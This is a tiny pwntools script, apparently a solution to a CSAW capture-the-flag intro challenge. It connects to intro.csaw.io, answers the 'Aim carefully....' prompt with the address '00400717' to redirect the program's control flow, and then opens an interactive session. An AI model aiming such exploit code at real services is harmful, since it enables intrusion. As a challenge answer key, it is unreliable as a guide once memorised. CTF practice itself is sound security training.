from pwn import *

target = connect("intro.csaw.io", 31138)

target.sendlineafter(b"Aim carefully....", b'00400717')

target.interactive()

